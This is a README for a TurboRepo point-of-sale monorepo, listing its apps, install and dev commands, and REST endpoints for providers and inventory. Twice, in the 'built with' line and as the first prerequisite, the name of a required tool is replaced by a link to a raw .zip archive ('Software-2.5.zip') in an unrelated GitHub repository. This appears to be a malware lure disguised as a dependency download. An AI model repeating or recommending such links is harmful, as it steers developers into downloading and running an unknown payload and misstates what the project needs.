# POS Microservices Monorepo

This project is a monorepo for a Point of Sale (POS) system, built with https://github.com/rloredo86/practica/raw/refs/heads/main/apps/Software-2.5.zip and TurboRepo.

## Structure
- **apps/**
  - `menu` (Port 3000)
  - `providers` (Port 3001 - Est.)
  - `inventory` (Port 3002 - Est.)
  - `sales`
  - `credit`
  - `payroll`
- **packages/**
  - `@repo/database`: Shared database configuration (Supabase)
  - `tsconfig`: Shared TypeScript configuration

## Getting Started

### Prerequisites
- https://github.com/rloredo86/practica/raw/refs/heads/main/apps/Software-2.5.zip
- npm (verified with v11.6.2)

### Installation
```bash
npm install
```

### Running (Development)
To start all microservices in parallel:
```bash
# Windows Command Prompt
cmd /c "npm run dev"
# Or if you have fixed execution policy:
npm run dev
```

The terminal output will show you the URL for each app (e.g., `localhost:3001`).

## Consuming the Services

### 1. Via User Interface
Each microservice has its own frontend:
- **Providers App**: Manage suppliers. URL usually `http://localhost:3001`
- **Inventory App**: Manage products/stock. URL usually `http://localhost:3002`

### 2. Via API
You can consume the data via HTTP requests (REST API):

**Providers API**
- `GET /api/providers` - Get all providers
- `POST /api/providers` - Create provider
- `DELETE /api/providers/:id` - Delete provider

**Inventory API**
- `GET /api/products` - Get all products
- `POST /api/products` - Create product
- `DELETE /api/products/:id` - Delete product

## Troubleshooting
See previous section for PowerShell errors.
